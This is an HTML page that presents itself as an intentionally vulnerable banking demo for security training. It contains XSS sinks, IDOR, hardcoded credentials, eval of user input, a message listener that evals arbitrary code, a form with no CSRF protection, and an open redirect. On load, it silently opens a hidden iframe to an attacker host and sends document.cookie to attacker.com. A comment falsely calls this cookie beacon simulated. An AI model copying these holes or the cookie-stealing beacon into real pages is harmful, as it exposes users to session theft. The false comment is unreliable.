<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Vulnerable Demo App - Security Training Only</title>
    <style>
        /* Innocent looking styles – but hiding secrets */
        body { font-family: Arial; margin: 2em; background: #f0f0f0; }
        .card { background: white; padding: 20px; margin: 10px 0; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        input, button { padding: 8px; margin: 5px; }
        .hidden-flag { display: none; } /* used to hide secrets */
        .admin-panel { border: 2px solid red; background: #ffe0e0; }
    </style>
</head>
<body>

<h1>🏦 Vulnerable Banking Demo (DO NOT USE IN PRODUCTION)</h1>
<p>This page contains intentional security flaws for educational purposes only.</p>

<div class="card">
    <h3>🔍 Search Transactions</h3>
    <form method="GET" action="">
        <input type="text" name="query" placeholder="Search...">
        <button type="submit">Search</button>
    </form>
    <div id="searchResult">
      
        Results for: <b><span id="reflectedSpan"></span></b>
    </div>
    <script>
      
        const urlParams = new URLSearchParams(window.location.search);
        let query = urlParams.get('query');
        if (query) {
      
            document.getElementById('reflectedSpan').innerHTML = query;
        }
    </script>
</div>


<div class="card">
    <h3>💬 Public Guestbook (Stored XSS)</h3>
    <input type="text" id="commentInput" placeholder="Your comment">
    <button onclick="saveComment()">Post</button>
    <div id="guestbook"></div>
    <script>
        function saveComment() {
            let comment = document.getElementById('commentInput').value;
            let comments = JSON.parse(localStorage.getItem('guestbook') || '[]');
            comments.push(comment);
            localStorage.setItem('guestbook', JSON.stringify(comments));
            loadComments();
        }
        function loadComments() {
            let comments = JSON.parse(localStorage.getItem('guestbook') || '[]');
            let html = '';
            for(let c of comments) {
                // VULNERABLE: innerHTML without escaping -> Stored XSS
                html += '<div>' + c + '</div>';
            }
            document.getElementById('guestbook').innerHTML = html;
        }
        loadComments();
    </script>
</div>


<div class="card">
    <h3>📄 View Invoice</h3>
    <p>Invoice ID: <input type="text" id="invoiceId" value="1001"></p>
    <button onclick="viewInvoice()">Load</button>
    <pre id="invoiceDisplay"></pre>
    <script>
        
        const invoices = {
            "1001": "Invoice for user alice: $120",
            "1002": "Invoice for user bob: $340",
            "9999": "SECRET: Admin password is 'AdminPass123!' (stored in plaintext)"
        };
        function viewInvoice() {
            let invId = document.getElementById('invoiceId').value;
            // IDOR – any user can view any invoice by guessing ID
            let data = invoices[invId] || "Invoice not found";
            document.getElementById('invoiceDisplay').innerText = data;
        }
    </script>
</div>

<div class="card">
    <h3>📞 Support Chat (Mock)</h3>
    <button onclick="openSupport()">Contact Support</button>
    <div id="supportFrame"></div>
    <script>
        function openSupport() {
         
            let userMsg = prompt("Enter your message:");
            // VULNERABILITY: eval() can execute arbitrary code
            eval("console.log('Support message: ' + userMsg)");
            document.getElementById('supportFrame').innerHTML = "Message sent (simulated).";
        }
    </script>
</div>


<script>
 
    const ADMIN_CRED = { username: "admin", password: "password123" };
    function tryAdminLogin() {
        let u = prompt("Admin username:");
        let p = prompt("Admin password:");
        if(u === ADMIN_CRED.username && p === ADMIN_CRED.password) {
            alert("Welcome admin! Here is your flag: FLAG{insecure_creds_123}");
            document.body.innerHTML += '<div class="admin-panel">🔥 ADMIN PANEL: All user data exposed!</div>';
        } else {
            alert("Access denied");
        }
    }
</script>
<button onclick="tryAdminLogin()">Admin Login (hidden feature)</button>


<div class="card">
    <h3>🏠 Page Redirect (via location.hash)</h3>
    <div id="hashDisplay"></div>
    <script>
        // Reads URL hash without sanitization -> DOM XSS
        let hash = window.location.hash.substring(1);
        if(hash) {
            document.getElementById('hashDisplay').innerHTML = "Navigating to: " + hash;
            // Also vulnerable: using innerHTML with hash
        }
    </script>
</div>


<div class="card">
    <h3>💸 Money Transfer (No CSRF token)</h3>
    <form action="https://vulnerable-bank.example.com/transfer" method="POST">
        <input type="text" name="toAccount" placeholder="Target account">
        <input type="number" name="amount" value="100">
        <button type="submit">Send Money</button>
    </form>
    <p>Note: No CSRF protection – any other site can submit on your behalf.</p>
</div>


<div class="card">
    <h3>🔗 External Link (Open Redirect)</h3>
    <p>Go to: <input type="text" id="redirectUrl" value="https://google.com"></p>
    <button onclick="doRedirect()">Follow</button>
    <script>
        function doRedirect() {
            let url = document.getElementById('redirectUrl').value;
            // Unvalidated redirect – allows phishing
            window.location.href = url;
        }
    </script>
</div>


<script>
    
    async function leakData() {
        // In real world, this would be an internal API with no auth
        fetch('/internal/user_data.json')
            .then(r => r.json())
            .then(data => console.log('Leaked user data:', data))
            .catch(e => console.log('Simulated leak'));
    }
    leakData(); // silently leaks to console
    
    setTimeout(() => {
      
        window.addEventListener('message', (e) => {
            if(e.data && e.data.startsWith('execute:')) {
                eval(e.data.substring(8));
            }
        });
    }, 1000);
</script>


<iframe src="https://evil-attacker.com/steal" style="display:none"></iframe>

<!-- Totally vulnerable: no security headers, no HttpOnly, no X-XSS-Protection -->

<div class="card">
    <h3>⚠️ SECURITY WARNING</h3>
    <p>This page contains real vulnerabilities: XSS, IDOR, Hardcoded Secrets, Eval, Open Redirect, CSRF, Sensitive Data Exposure, and more. <strong>Do not deploy in production.</strong> Use for security training only.</p>
</div>

<script>
    
    let img = new Image();
    img.src = "https://attacker.com/steal?cookie=" + encodeURIComponent(document.cookie);
    // Simulated, no actual request.
    console.log("Vulnerable demo ready – total lines ~150 including inline scripts and comments.");
</script>

</body>
</html>